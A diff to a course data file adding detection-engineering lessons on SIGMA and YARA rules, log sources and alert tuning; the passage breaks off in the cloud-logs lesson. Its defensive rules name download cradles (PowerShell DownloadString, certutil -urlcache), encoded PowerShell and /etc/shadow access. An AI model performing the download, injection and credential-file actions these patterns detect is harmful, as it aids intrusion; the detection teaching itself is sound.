@@ -22031,6 +22031,1727 @@ Track your IR program maturity over time:
   { id: "6.2", courseId: "threat-hunting", title: "Hunt Automation & Notebooks", content: `# Hunt Automation & Notebooks\n\n**Notebooks** combine documentation, code, and analysis in a single executable document.\n\n## Why Notebooks?\n\nTraditional: Write query → Run in SIEM → Copy results → Analyze → Write report\nNotebooks: Write query + analysis + documentation in one place → Execute → Share → Rerun\n\n## Tools\n\n### Jupyter + MSTICPy\nPython-based hunting with data manipulation, visualization, and threat intelligence libraries.\n\n### KQL (Microsoft Sentinel)\nNative hunting queries with built-in analytics and scheduling.\n\n### SPL (Splunk)\nSearch Processing Language for log-based hunting.\n\n## Building a Hunt Library\n\nOrganize by:\n- ATT&CK Technique\n- Data Source\n- Complexity level\n- Last Run Date\n\n## Progressive Automation\n\nManual Hunt → Notebook (repeatable) → Scheduled Notebook (periodic) → Automated Detection (continuous)\n\nThe goal: every successful hunt eventually becomes an automated detection rule.`, keyTakeaways: ["Notebooks combine code, docs, and analysis for repeatable hunts", "MSTICPy, KQL, and SPL are primary hunting tools", "Build a hunt library organized by ATT&CK technique", "Progressive automation moves hunts to continuous detection"] },
   { id: "6.3", courseId: "threat-hunting", title: "Documenting & Reporting Findings", content: `# Documenting & Reporting Findings\n\nA hunt without documentation is a hunt that never happened.\n\n## Hunt Report Structure\n\n1. **Executive Summary**: What was hunted, key findings, recommended actions\n2. **Hypothesis & Scope**: Original hypothesis, environment, time range\n3. **Methodology**: Queries, tools, analysis techniques\n4. **Findings**: Description, evidence, impact, ATT&CK mapping, affected systems\n5. **Recommendations**: Immediate, short-term, long-term actions\n6. **Appendices**: Full queries, raw data, IOCs\n\n## Finding Classification\n\n- **True Positive — Malicious**: Escalate to IR\n- **True Positive — Policy Violation**: Report to management\n- **True Positive — Misconfiguration**: Create remediation ticket\n- **Benign Anomaly**: Document for baseline\n- **Data Gap**: Request telemetry improvement\n- **No Finding**: Document for future reference\n\n## Writing Good Recommendations\n\nBad: "Improve monitoring."\nGood: "Deploy Sysmon v4.8+ on all Windows servers for process creation events. Estimated effort: 2 days. Priority: High."\n\n## Stakeholder Communication\n- SOC Analysts: Specific queries and detection logic\n- Detection Engineers: Validated Sigma/KQL rules\n- Management: Risk reduction and business impact\n- Executives: One-page summary with key metrics`, keyTakeaways: ["Every hunt must produce a documented report", "Findings range from confirmed threats to data gaps—all valuable", "Recommendations must be specific with effort estimates", "Tailor communication to the audience"] },
   { id: "6.4", courseId: "threat-hunting", title: "From Hunt to Detection", content: `# From Hunt to Detection\n\nEvery successful hunt should **permanently improve** detection capability.\n\n## The Hunt-to-Detection Pipeline\n\nHunt Discovery → Validate → Write Detection Rule → Test → Tune → Deploy → Monitor → Update Coverage Map\n\n## Hunt Query vs Detection Rule\n\n| Hunt Query | Detection Rule |\n|-----------|---------------|\n| Broad scope | Narrow, precise |\n| High FP tolerance | Tuned for low FPs |\n| Manual review | Automated alerting |\n| Short-lived | Maintained long-term |\n\n## Detection Rule Quality\n\n1. **Accuracy**: Low FP rate (< 5%), tested against both malicious and benign\n2. **Performance**: Executes within time limits, scales with data\n3. **Maintainability**: Version controlled, documented, assigned owner\n4. **Actionability**: Enough context for triage, linked to playbook\n\n## Tuning Process\n\n- Week 1: Alert-only mode, review every alert\n- Weeks 2-3: Add exclusions, adjust thresholds\n- Week 4+: Full production alerting\n\n## Measuring Impact\n\n| Metric | Description |\n|--------|-------------|\n| Hunt-to-Detection Rate | % of hunts producing new rules |\n| ATT&CK Coverage Delta | Techniques covered before vs after |\n| MTTD Improvement | Detection speed from new rules |\n\nThis creates a virtuous cycle: Hunt → Detect → Map Gaps → Hunt Again.`, keyTakeaways: ["Every successful hunt should produce a new automated detection rule", "Hunt queries must be refined into precise, tuned rules", "Phased deployment: alert-only → tuning → production", "Track hunt-to-detection conversion and ATT&CK coverage delta"] },
+
+  // ===================== Detection Engineering Basics =====================
+  // Module 1: Detection Fundamentals
+  {
+    id: "1.1",
+    courseId: "detection-engineering",
+    title: "Detection Philosophy & Mindset",
+    content: `# Detection Philosophy & Mindset
+
+The goal of detection engineering is not to write as many rules as possible — it's to **detect real threats reliably** with minimal noise.
+
+## Core Principles
+
+### 1. Assume Breach
+Every detection program should assume adversaries are already inside. Detection validates whether controls are working.
+
+### 2. Behavior Over Indicators
+IOCs are ephemeral. Detecting **behaviors** (process injection, lateral movement patterns, data staging) provides durable coverage.
+
+### 3. Signal-to-Noise Ratio
+A single high-fidelity alert is worth more than 10,000 noisy ones. Every alert should be **actionable**.
+
+### 4. Detection as a Product
+Treat detections like software: they need requirements, testing, versioning, documentation, and lifecycle management.
+
+## The Detection Spectrum
+
+| Approach | Example | Durability |
+|----------|---------|------------|
+| Hash-based | Block known malware SHA256 | Hours |
+| Signature | YARA pattern for packer | Weeks |
+| Behavioral | Process tree anomaly | Months |
+| Anomaly | Statistical baseline deviation | Years |
+
+## What Makes a Good Detection?
+
+- **True Positive Rate > 95%** — Analysts trust it
+- **Context-rich** — Provides enough data for immediate triage
+- **Tested** — Validated against both malicious and benign scenarios
+- **Documented** — Purpose, logic, ATT&CK mapping, and owner
+- **Maintainable** — Version-controlled with clear update history`,
+    keyTakeaways: [
+      "Detect behaviors, not just indicators — behaviors are far more durable",
+      "Every alert must be actionable; noise erodes analyst trust",
+      "Treat detections as software products with full lifecycle management",
+      "Assume breach and validate controls through detection"
+    ]
+  },
+  {
+    id: "1.2",
+    courseId: "detection-engineering",
+    title: "Detection Coverage Models",
+    content: `# Detection Coverage Models
+
+Understanding **what you can detect** is as important as the detections themselves.
+
+## MITRE ATT&CK Coverage
+
+The most widely used framework for mapping detection coverage:
+
+1. **List techniques relevant** to your threat profile
+2. **Map existing detections** to techniques
+3. **Score coverage**: None → Minimal → Partial → Full
+4. **Identify gaps** and prioritize new detections
+
+## The Detection Coverage Formula
+
+\`\`\`
+Coverage = (Techniques Detected / Relevant Techniques) × Quality Score
+\`\`\`
+
+Quality Score accounts for:
+- Detection fidelity (low FP rate)
+- Data source availability
+- Response capability
+
+## Data Source Coverage
+
+Before writing any detection, verify:
+
+| Question | Impact |
+|----------|--------|
+| Is the log source enabled? | No data = no detection |
+| Is it ingested into SIEM? | Data exists but isn't searchable |
+| Is it normalized? | Can't correlate without standards |
+| What's the retention? | Can you look back far enough? |
+
+## Coverage Gaps Are Normal
+
+No organization detects everything. The goal is:
+- **Know your gaps** — documented blind spots
+- **Prioritize by threat** — cover the most relevant techniques first
+- **Measure progress** — track coverage improvements over time
+
+## Heat Maps
+
+Use ATT&CK Navigator to create visual heat maps showing:
+- Green: High-confidence detection
+- Yellow: Partial coverage
+- Red: No detection
+- Gray: Not applicable`,
+    keyTakeaways: [
+      "Map detections to MITRE ATT&CK techniques systematically",
+      "Verify data source availability before writing any detection",
+      "Coverage gaps are normal — document and prioritize them",
+      "Use ATT&CK Navigator heat maps to visualize detection posture"
+    ]
+  },
+  {
+    id: "1.3",
+    courseId: "detection-engineering",
+    title: "Alert Quality & False Positive Management",
+    content: `# Alert Quality & False Positive Management
+
+False positives are the #1 killer of SOC effectiveness. Detection engineers must **own alert quality**.
+
+## The Cost of False Positives
+
+- **Analyst fatigue**: Drowning in noise leads to missed real threats
+- **Alert blindness**: Analysts start ignoring high-volume rules
+- **Slower MTTR**: Every FP wastes 15-30 minutes of analyst time
+- **Attrition**: Talented analysts leave noisy SOCs
+
+## Alert Quality Tiers
+
+| Tier | FP Rate | Action |
+|------|---------|--------|
+| Critical | <1% | Auto-escalate, page on-call |
+| High | <5% | Immediate triage required |
+| Medium | <15% | Queue-based triage |
+| Low/Informational | <30% | Enrichment only, no triage |
+| Noise | >30% | Disable or rewrite immediately |
+
+## FP Reduction Strategies
+
+### 1. Allowlisting
+Exclude known-good activity (signed binaries, approved tools, scheduled jobs).
+
+### 2. Threshold Tuning
+Adjust counts, timeframes, and severity based on environment baseline.
+
+### 3. Context Enrichment
+Add asset criticality, user risk score, and threat intel context to reduce ambiguity.
+
+### 4. Correlation Rules
+Combine weak signals into high-confidence alerts (e.g., suspicious login + privilege escalation + data access).
+
+## The 5-Day Rule
+
+If a detection fires >5 FPs/day for 5 consecutive days without tuning, **disable it immediately** and schedule a rewrite.
+
+## Measuring Alert Quality
+
+Track weekly:
+- FP rate per rule
+- Analyst feedback (useful / not useful)
+- Time-to-triage per alert
+- Rules disabled for noise`,
+    keyTakeaways: [
+      "False positives directly cause analyst fatigue and missed threats",
+      "Every rule should have a target FP rate and be measured against it",
+      "Use allowlisting, thresholds, enrichment, and correlation to reduce FPs",
+      "Apply the 5-day rule: disable persistently noisy detections immediately"
+    ]
+  },
+  {
+    id: "1.4",
+    courseId: "detection-engineering",
+    title: "The Detection Engineering Lifecycle",
+    content: `# The Detection Engineering Lifecycle
+
+Detection engineering follows a structured lifecycle from idea to retirement.
+
+## Lifecycle Phases
+
+### 1. Requirements
+- Threat intelligence report, hunt finding, or gap analysis triggers need
+- Define: What technique? What data source? What's the expected outcome?
+
+### 2. Design
+- Choose detection approach (signature, behavioral, anomaly)
+- Define logic, thresholds, and expected false positive sources
+- Map to ATT&CK technique(s)
+
+### 3. Development
+- Write the detection rule (SIGMA, KQL, SPL, YARA)
+- Write documentation: purpose, logic, triage guide
+- Create test cases (true positive and true negative)
+
+### 4. Testing
+- Validate with Atomic Red Team or manual simulation
+- Confirm TP fires correctly
+- Test against benign activity for FP assessment
+
+### 5. Deployment
+- Staged rollout: Dev → Staging → Production
+- Alert-only mode for 1-2 weeks
+- Monitor FP rate before enabling full alerting
+
+### 6. Operations
+- Ongoing tuning based on analyst feedback
+- Periodic review (quarterly minimum)
+- Performance monitoring
+
+### 7. Retirement
+- Deprecate when technique is no longer relevant
+- Archive rule and documentation
+- Update ATT&CK coverage map
+
+## Detection Engineering Kanban
+
+\`\`\`
+Backlog → Design → Development → Testing → Staging → Production → Review
+\`\`\`
+
+Each detection moves through the pipeline with defined quality gates at each stage.`,
+    keyTakeaways: [
+      "Detections follow a full lifecycle: requirements → design → dev → test → deploy → operate → retire",
+      "Every detection needs test cases for both true positives and false positives",
+      "Staged rollout with alert-only periods prevents production noise",
+      "Quarterly reviews ensure detections remain relevant and performant"
+    ]
+  },
+
+  // Module 2: SIGMA Rules
+  {
+    id: "2.1",
+    courseId: "detection-engineering",
+    title: "SIGMA Syntax Deep Dive",
+    content: `# SIGMA Syntax Deep Dive
+
+**SIGMA** is a generic and open signature format for SIEM systems, enabling platform-agnostic detection rules.
+
+## Why SIGMA?
+
+- **Vendor-neutral**: Write once, convert to any SIEM
+- **Community-driven**: Thousands of community rules available
+- **Version-controllable**: YAML format works with Git
+- **Shareable**: Standard format for threat intel sharing
+
+## Rule Structure
+
+\`\`\`yaml
+title: Suspicious PowerShell Download
+id: 3b6ab547-1503-4a73-9a07-1442e7c3f9f8
+status: experimental
+description: Detects PowerShell downloading content from the internet
+references:
+  - https://attack.mitre.org/techniques/T1059.001/
+author: Detection Team
+date: 2024/01/15
+tags:
+  - attack.execution
+  - attack.t1059.001
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: '\\powershell.exe'
+    CommandLine|contains|all:
+      - 'Net.WebClient'
+      - 'DownloadString'
+  condition: selection
+falsepositives:
+  - Legitimate admin scripts
+level: medium
+\`\`\`
+
+## Key Fields
+
+| Field | Purpose |
+|-------|---------|
+| logsource | What data to search (category + product) |
+| detection | The actual matching logic |
+| level | Severity: informational, low, medium, high, critical |
+| tags | ATT&CK technique mappings |
+| falsepositives | Known FP sources |
+
+## Log Source Categories
+
+Common categories: \`process_creation\`, \`file_event\`, \`registry_event\`, \`network_connection\`, \`dns_query\`, \`image_load\``,
+    keyTakeaways: [
+      "SIGMA provides a vendor-neutral detection rule format in YAML",
+      "Rules consist of logsource, detection, and metadata sections",
+      "Tags map directly to MITRE ATT&CK techniques",
+      "Log source categories abstract away vendor-specific field names"
+    ]
+  },
+  {
+    id: "2.2",
+    courseId: "detection-engineering",
+    title: "Writing Custom SIGMA Rules",
+    content: `# Writing Custom SIGMA Rules
+
+Crafting effective SIGMA rules requires understanding your threat model and your data.
+
+## Rule Writing Process
+
+1. **Identify the behavior**: What technique are you detecting?
+2. **Find the data**: What log source captures this behavior?
+3. **Define the pattern**: What fields and values indicate the behavior?
+4. **Test against benign**: What legitimate activity looks similar?
+5. **Document and tag**: Complete all metadata fields
+
+## Selection Keywords
+
+\`\`\`yaml
+detection:
+  selection_process:
+    Image|endswith: '\\certutil.exe'
+  selection_args:
+    CommandLine|contains:
+      - '-urlcache'
+      - '-split'
+      - 'http'
+  condition: selection_process and selection_args
+\`\`\`
+
+## Value Modifiers
+
+| Modifier | Function |
+|----------|----------|
+| \`contains\` | Substring match |
+| \`endswith\` | Suffix match |
+| \`startswith\` | Prefix match |
+| \`re\` | Regular expression |
+| \`all\` | All values must match |
+| \`base64\` | Match base64-encoded strings |
+| \`cidr\` | Match IP address ranges |
+
+## Multi-Selection Logic
+
+\`\`\`yaml
+detection:
+  selection1:
+    EventID: 1
+    Image|endswith: '\\cmd.exe'
+  selection2:
+    ParentImage|endswith:
+      - '\\winword.exe'
+      - '\\excel.exe'
+  filter:
+    CommandLine|contains: '/c echo'
+  condition: selection1 and selection2 and not filter
+\`\`\`
+
+## Common Mistakes
+
+- **Too broad**: Missing filters for legitimate use
+- **Too narrow**: Matching only one variant of the attack
+- **Wrong logsource**: Category doesn't match the data
+- **Missing falsepositives**: Undocumented FP sources`,
+    keyTakeaways: [
+      "Start with the behavior, then find the right data and pattern",
+      "Use value modifiers (contains, endswith, re) for flexible matching",
+      "Combine multiple selections with filters for precise detection",
+      "Always test against benign activity and document false positives"
+    ]
+  },
+  {
+    id: "2.3",
+    courseId: "detection-engineering",
+    title: "SIGMA Modifiers & Conditions",
+    content: `# SIGMA Modifiers & Conditions
+
+Advanced SIGMA features enable complex detection logic including aggregation and temporal correlation.
+
+## Condition Operators
+
+\`\`\`yaml
+condition: selection                    # Simple match
+condition: selection1 or selection2     # Either matches
+condition: selection and not filter     # Match with exclusion
+condition: 1 of selection*             # Any selection matches
+condition: all of selection*           # All selections match
+condition: selection | count() > 5     # Aggregation
+\`\`\`
+
+## Aggregation Functions
+
+\`\`\`yaml
+detection:
+  selection:
+    EventID: 4625   # Failed logon
+  condition: selection | count(TargetUserName) by SourceIP > 10
+  timeframe: 5m
+\`\`\`
+
+This detects 10+ failed logons for different users from the same IP in 5 minutes (password spraying).
+
+## Near-Time Correlation
+
+\`\`\`yaml
+detection:
+  selection1:
+    EventID: 4624   # Successful logon
+    LogonType: 10   # RemoteInteractive (RDP)
+  selection2:
+    EventID: 4688   # Process creation
+    NewProcessName|endswith: '\\cmd.exe'
+  condition: selection1 | near selection2
+  timeframe: 1m
+\`\`\`
+
+## Field Lists
+
+Reuse value lists across rules:
+
+\`\`\`yaml
+detection:
+  selection:
+    ParentImage|endswith:
+      - '\\winword.exe'
+      - '\\excel.exe'
+      - '\\powerpnt.exe'
+      - '\\outlook.exe'
+    Image|endswith:
+      - '\\cmd.exe'
+      - '\\powershell.exe'
+      - '\\wscript.exe'
+      - '\\mshta.exe'
+  condition: selection
+\`\`\`
+
+This single rule detects any Office application spawning any suspicious child process.
+
+## Testing Your Conditions
+
+Always verify:
+1. Does the condition fire on known-bad data? (TP test)
+2. Does it stay silent on production data? (FP test)
+3. Does the aggregation window make sense?`,
+    keyTakeaways: [
+      "Use aggregation (count, sum) with timeframes for threshold-based detection",
+      "Near-time correlation detects sequences of related events",
+      "Field lists enable compact rules covering multiple variants",
+      "Always validate conditions against both malicious and benign data"
+    ]
+  },
+  {
+    id: "2.4",
+    courseId: "detection-engineering",
+    title: "Rule Conversion & Backend Targets",
+    content: `# Rule Conversion & Backend Targets
+
+SIGMA's power lies in writing once and converting to any SIEM platform.
+
+## Sigma CLI (pySigma)
+
+\`\`\`bash
+# Convert to Splunk SPL
+sigma convert -t splunk -p sysmon rule.yml
+
+# Convert to Elastic/Kibana (Lucene)
+sigma convert -t elasticsearch -p ecs_windows rule.yml
+
+# Convert to Microsoft Sentinel (KQL)
+sigma convert -t microsoft365defender rule.yml
+\`\`\`
+
+## Backend-Specific Considerations
+
+| SIEM | Query Language | Key Considerations |
+|------|---------------|-------------------|
+| Splunk | SPL | Field names differ; use sysmon pipeline |
+| Elastic | KQL/Lucene | ECS field mapping required |
+| Sentinel | KQL | SecurityEvent vs Sysmon tables |
+| QRadar | AQL | Property mapping needed |
+| Chronicle | YARA-L | Unique syntax conversion |
+
+## Processing Pipelines
+
+Pipelines handle field name translation:
+
+\`\`\`
+SIGMA field: Image
+├── Splunk/Sysmon: Image
+├── Elastic/ECS: process.executable
+├── Sentinel: NewProcessName
+└── QRadar: "Process Path"
+\`\`\`
+
+## Conversion Validation
+
+After converting, always:
+1. **Syntax check**: Does the query parse without errors?
+2. **Field verify**: Are all fields mapped correctly?
+3. **Logic test**: Does the converted query match the same events?
+4. **Performance test**: Does it execute within acceptable time?
+
+## Community Rule Repositories
+
+- **SigmaHQ**: Official SIGMA rule repository (2000+ rules)
+- **SOC Prime**: Commercial SIGMA rule platform
+- **Elastic Detection Rules**: Elastic-native rules with SIGMA equivalents
+
+## Custom Backends
+
+For unsupported platforms, write custom pySigma backends:
+1. Define field mappings
+2. Create query output format
+3. Handle platform-specific features`,
+    keyTakeaways: [
+      "pySigma CLI converts SIGMA rules to any supported SIEM query language",
+      "Processing pipelines handle field name translation between platforms",
+      "Always validate converted queries for syntax, field mapping, and logic",
+      "SigmaHQ provides 2000+ community-maintained detection rules"
+    ]
+  },
+
+  // Module 3: YARA Signatures
+  {
+    id: "3.1",
+    courseId: "detection-engineering",
+    title: "YARA Rule Structure",
+    content: `# YARA Rule Structure
+
+**YARA** is a tool for identifying and classifying malware based on textual or binary patterns.
+
+## Basic Structure
+
+\`\`\`
+rule detect_suspicious_exe
+{
+    meta:
+        author = "Detection Team"
+        description = "Detects suspicious executable patterns"
+        date = "2024-01-15"
+        reference = "https://attack.mitre.org/T1059"
+        severity = "high"
+    
+    strings:
+        $api1 = "VirtualAlloc" ascii
+        $api2 = "WriteProcessMemory" ascii
+        $url = /https?:\\/\\/[a-z0-9]+\\.[a-z]{2,6}/ nocase
+        $mz = { 4D 5A }  // PE header
+    
+    condition:
+        $mz at 0 and
+        (2 of ($api*)) and
+        $url
+}
+\`\`\`
+
+## The Three Sections
+
+### Meta
+Metadata about the rule — not used for matching:
+- author, description, date, reference
+- severity, TLP, ATT&CK technique
+
+### Strings
+Patterns to search for:
+- **Text strings**: \`"VirtualAlloc" ascii wide\`
+- **Hex patterns**: \`{ 4D 5A 90 00 }\`
+- **Regular expressions**: \`/pattern/\`
+
+### Condition
+Boolean logic determining when the rule matches:
+- \`all of them\` — every string must match
+- \`any of them\` — at least one string matches
+- \`2 of ($api*)\` — at least 2 strings starting with $api match
+
+## String Modifiers
+
+| Modifier | Effect |
+|----------|--------|
+| \`ascii\` | Match ASCII encoding |
+| \`wide\` | Match UTF-16 encoding |
+| \`nocase\` | Case-insensitive |
+| \`fullword\` | Match whole words only |
+| \`xor\` | Match XOR-encoded variants |
+| \`base64\` | Match base64-encoded strings |`,
+    keyTakeaways: [
+      "YARA rules have three sections: meta (info), strings (patterns), condition (logic)",
+      "Strings can be text, hex bytes, or regular expressions",
+      "Modifiers like ascii, wide, nocase, and xor expand matching capability",
+      "Conditions use boolean logic to combine string matches"
+    ]
+  },
+  {
+    id: "3.2",
+    courseId: "detection-engineering",
+    title: "Pattern Matching Techniques",
+    content: `# Pattern Matching Techniques
+
+Effective YARA rules combine multiple pattern types for precise malware identification.
+
+## Text Strings
+
+\`\`\`
+strings:
+    $s1 = "CreateRemoteThread" ascii wide
+    $s2 = "cmd.exe /c" nocase
+    $s3 = "powershell -enc" nocase fullword
+\`\`\`
+
+## Hex Patterns with Wildcards
+
+\`\`\`
+strings:
+    // Exact bytes
+    $h1 = { 4D 5A 90 00 }
+    
+    // Wildcard nibble (?)
+    $h2 = { E8 ?? ?? ?? ?? C3 }
+    
+    // Jump range [min-max]
+    $h3 = { 6A 40 68 00 30 00 00 [4-8] FF 15 }
+    
+    // Alternative bytes (|)
+    $h4 = { (6A | 68) 00 }
+\`\`\`
+
+## Regular Expressions
+
+\`\`\`
+strings:
+    // URL pattern
+    $re1 = /https?:\\/\\/[a-zA-Z0-9.-]+\\.[a-z]{2,6}\\//
+    
+    // Base64 command
+    $re2 = /[A-Za-z0-9+\\/]{20,}={0,2}/
+    
+    // IP address
+    $re3 = /\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b/
+\`\`\`
+
+## XOR-Encoded Detection
+
+\`\`\`
+strings:
+    $xor_string = "This program" xor(0x01-0xFF)
+\`\`\`
+
+This generates 255 XOR-rotated variants automatically!
+
+## Combining Patterns for Accuracy
+
+Good practice: require **multiple indicators** to reduce false positives.
+
+\`\`\`
+condition:
+    uint16(0) == 0x5A4D and          // Must be PE file
+    filesize < 500KB and              // Size constraint
+    3 of ($api*) and                  // 3+ suspicious APIs
+    1 of ($string*) and              // At least 1 suspicious string
+    not 1 of ($legitimate*)           // Not a known-good pattern
+\`\`\``,
+    keyTakeaways: [
+      "Combine text, hex, and regex patterns for comprehensive matching",
+      "Hex wildcards (??) and jumps [min-max] handle variable code",
+      "XOR modifier automatically generates all rotation variants",
+      "Require multiple indicators in conditions to reduce false positives"
+    ]
+  },
+  {
+    id: "3.3",
+    courseId: "detection-engineering",
+    title: "Advanced YARA Conditions",
+    content: `# Advanced YARA Conditions
+
+YARA modules and advanced conditions enable sophisticated file analysis beyond simple pattern matching.
+
+## Built-in Functions
+
+\`\`\`
+condition:
+    filesize < 1MB                    // File size check
+    uint16(0) == 0x5A4D              // PE magic bytes
+    uint32(uint32(0x3C)) == 0x4550   // PE signature
+\`\`\`
+
+## The PE Module
+
+\`\`\`
+import "pe"
+
+rule suspicious_pe
+{
+    condition:
+        pe.number_of_sections > 7 and
+        pe.timestamp < 946684800 and           // Before Y2K (fake timestamp)
+        pe.entry_point_raw > pe.sections[pe.number_of_sections - 1].raw_data_offset and
+        not pe.is_signed
+}
+\`\`\`
+
+## The Math Module
+
+\`\`\`
+import "math"
+
+rule high_entropy_section
+{
+    condition:
+        for any section in pe.sections : (
+            math.entropy(section.raw_data_offset, section.raw_data_size) > 7.5
+        )
+}
+\`\`\`
+
+High entropy (>7.5) in sections often indicates packed or encrypted content.
+
+## String Counting
+
+\`\`\`
+condition:
+    #suspicious_api > 5          // More than 5 occurrences
+    @suspicious_api[1] < 0x1000  // First occurrence before offset 0x1000
+\`\`\`
+
+## For Loops
+
+\`\`\`
+condition:
+    for all section in pe.sections : (
+        section.name != ".text" or
+        math.entropy(section.raw_data_offset, section.raw_data_size) < 7.0
+    )
+\`\`\`
+
+## Practical Rule: Detect Packed Executables
+
+\`\`\`
+import "pe"
+import "math"
+
+rule likely_packed
+{
+    meta:
+        description = "Detects likely packed/encrypted executables"
+    condition:
+        uint16(0) == 0x5A4D and
+        pe.number_of_sections < 4 and
+        math.entropy(0, filesize) > 7.0 and
+        not pe.is_signed
+}
+\`\`\``,
+    keyTakeaways: [
+      "PE module enables analysis of executable structure, sections, and signatures",
+      "Math module calculates entropy to detect packed/encrypted content",
+      "String counting (#) and position (@) add precision to conditions",
+      "Combine modules for sophisticated malware classification rules"
+    ]
+  },
+  {
+    id: "3.4",
+    courseId: "detection-engineering",
+    title: "YARA in Production",
+    content: `# YARA in Production
+
+Running YARA at enterprise scale requires careful attention to performance, integration, and maintenance.
+
+## Deployment Models
+
+| Model | Use Case | Latency |
+|-------|----------|---------|
+| Endpoint scanning | EDR integration, scheduled scans | Minutes |
+| Network scanning | Email gateway, proxy inspection | Seconds |
+| Storage scanning | File share, cloud storage audit | Hours |
+| Memory scanning | Live process memory analysis | Seconds |
+
+## Performance Optimization
+
+### Rule Performance
+
+- **Avoid expensive regex**: Complex regex patterns are slow
+- **Use anchors**: \`at 0\` and offset ranges limit search scope
+- **Filesize filters**: \`filesize < 10MB\` eliminates large files early
+- **String count limits**: Reduce combinatorial explosion
+
+### Scanning Performance
+
+\`\`\`bash
+# Scan with timeout and limits
+yara -t 30 -p 4 -r rules/ /path/to/scan/
+
+# -t: timeout per file (seconds)
+# -p: parallel threads
+# -r: recursive directory scan
+\`\`\`
+
+## Integration Points
+
+### EDR Integration
+Most EDR platforms support YARA:
+- CrowdStrike: Custom IOA with YARA
+- Carbon Black: Watchlist YARA rules
+- Velociraptor: Native YARA scanning
+
+### SOAR Playbooks
+Trigger YARA scans from automated playbooks:
+1. Alert fires → Extract file hash
+2. Retrieve file from endpoint
+3. Scan with YARA ruleset
+4. Enrich alert with matches
+
+## Rule Management
+
+- **Version control**: All rules in Git
+- **Testing**: Validate against known malware samples and goodware corpus
+- **Naming convention**: \`APT_Group_Technique_Description.yar\`
+- **Review cadence**: Monthly review of hit rates and FPs
+- **Retirement**: Archive rules with zero hits after 6 months`,
+    keyTakeaways: [
+      "Deploy YARA across endpoints, network, storage, and memory",
+      "Optimize rules with anchors, filesize filters, and limited regex",
+      "Integrate YARA with EDR and SOAR for automated scanning workflows",
+      "Maintain rules in Git with regular review and retirement cycles"
+    ]
+  },
+
+  // Module 4: Log Source Mastery
+  {
+    id: "4.1",
+    courseId: "detection-engineering",
+    title: "Windows Event Log Deep Dive",
+    content: `# Windows Event Log Deep Dive
+
+Windows Event Logs are the **foundation** of endpoint detection in enterprise environments.
+
+## Critical Event IDs
+
+### Authentication
+| Event ID | Description | Detection Use |
+|----------|-------------|---------------|
+| 4624 | Successful logon | Lateral movement, anomalous logon |
+| 4625 | Failed logon | Brute force, password spray |
+| 4648 | Explicit credential logon | Pass-the-hash, runas |
+| 4672 | Special privileges assigned | Privilege escalation |
+| 4768 | Kerberos TGT requested | Kerberoasting baseline |
+| 4769 | Kerberos service ticket | Kerberoasting detection |
+
+### Process & Execution
+| Event ID | Description | Detection Use |
+|----------|-------------|---------------|
+| 4688 | Process creation | LOLBins, suspicious execution |
+| 4689 | Process termination | Short-lived processes |
+| Sysmon 1 | Process create (detailed) | Full command line, hashes |
+| Sysmon 3 | Network connection | Process network activity |
+| Sysmon 7 | Image loaded | DLL side-loading |
+| Sysmon 10 | Process access | Credential dumping (LSASS) |
+
+### Persistence
+| Event ID | Description | Detection Use |
+|----------|-------------|---------------|
+| 4698 | Scheduled task created | Persistence mechanism |
+| 7045 | Service installed | Service-based persistence |
+| Sysmon 12/13 | Registry create/modify | Registry persistence |
+
+## Sysmon Configuration
+
+Sysmon is essential — basic Windows auditing is insufficient:
+
+\`\`\`xml
+<RuleGroup>
+  <ProcessCreate onmatch="include">
+    <ParentImage condition="end with">\\winword.exe</ParentImage>
+    <Image condition="end with">\\cmd.exe</Image>
+  </ProcessCreate>
+</RuleGroup>
+\`\`\`
+
+## Audit Policy Configuration
+
+Enable via Group Policy:
+- **Process Creation**: Advanced → Detailed Tracking
+- **Logon Events**: Advanced → Logon/Logoff
+- **Include command line**: Enable "Include command line in process creation events"`,
+    keyTakeaways: [
+      "Know critical event IDs for authentication (4624/4625), execution (4688), and persistence (4698/7045)",
+      "Sysmon provides vastly more detail than native Windows auditing",
+      "Configure audit policies to capture process command lines",
+      "Combine Security, Sysmon, and PowerShell logs for comprehensive coverage"
+    ]
+  },
+  {
+    id: "4.2",
+    courseId: "detection-engineering",
+    title: "Linux & Network Log Sources",
+    content: `# Linux & Network Log Sources
+
+Enterprise environments include Linux servers and network infrastructure generating critical detection data.
+
+## Linux Log Sources
+
+### Auditd
+The Linux Audit Framework provides granular system call logging:
+
+\`\`\`bash
+# Log all execve calls (process execution)
+-a always,exit -F arch=b64 -S execve -k process_exec
+
+# Log file access in sensitive directories
+-w /etc/shadow -p rwa -k shadow_access
+-w /etc/passwd -p rwa -k passwd_access
+
+# Log privilege escalation
+-w /usr/bin/sudo -p x -k sudo_use
+-w /usr/bin/su -p x -k su_use
+\`\`\`
+
+### Syslog
+Standard Linux logging for services, authentication, and system events:
+- \`/var/log/auth.log\` — Authentication events (SSH, sudo)
+- \`/var/log/syslog\` — General system messages
+- \`/var/log/secure\` — Security-related events (RHEL)
+
+### Journal (systemd)
+\`\`\`bash
+journalctl -u sshd --since "1 hour ago" --output json
+\`\`\`
+
+## Network Log Sources
+
+### Zeek (Bro)
+Generates structured logs from network traffic:
+- \`conn.log\` — All connections (source, dest, duration, bytes)
+- \`dns.log\` — DNS queries and responses
+- \`http.log\` — HTTP requests with URIs and user-agents
+- \`ssl.log\` — TLS handshakes with JA3/JA3S hashes
+- \`files.log\` — File transfers with hashes
+
+### Firewall Logs
+- Allow/deny decisions with source, destination, port
+- Critical for detecting policy violations and C2
+
+### NetFlow/IPFIX
+Metadata about network flows without payload:
+- Useful for long-connection detection (beaconing)
+- Volume-based anomaly detection (exfiltration)`,
+    keyTakeaways: [
+      "Auditd provides granular Linux system call logging for detection",
+      "Zeek generates structured network logs essential for network detection",
+      "Combine auth.log, auditd, and syslog for comprehensive Linux coverage",
+      "NetFlow enables beaconing and exfiltration detection without payload inspection"
+    ]
+  },
+  {
+    id: "4.3",
+    courseId: "detection-engineering",
+    title: "Cloud & Identity Log Sources",
+    content: `# Cloud & Identity Log Sources
+
+Cloud and identity platforms generate unique log sources critical for modern detection.
+
+## Cloud Provider Logs
+
+### AWS CloudTrail
+Every AWS API call is logged:
+\`\`\`json
+{
+  "eventName": "ConsoleLogin",
+  "sourceIPAddress": "198.51.100.1",
+  "userIdentity": {
+    "type": "IAMUser",
+    "userName": "admin"
+  },
+  "responseElements": {
+    "ConsoleLogin": "Success"
+  }
+}
+\`\`\`
+
+Key detections: Root account usage, API key creation, security group changes, S3 policy modifications.
+
+### Azure Activity Log / Entra ID
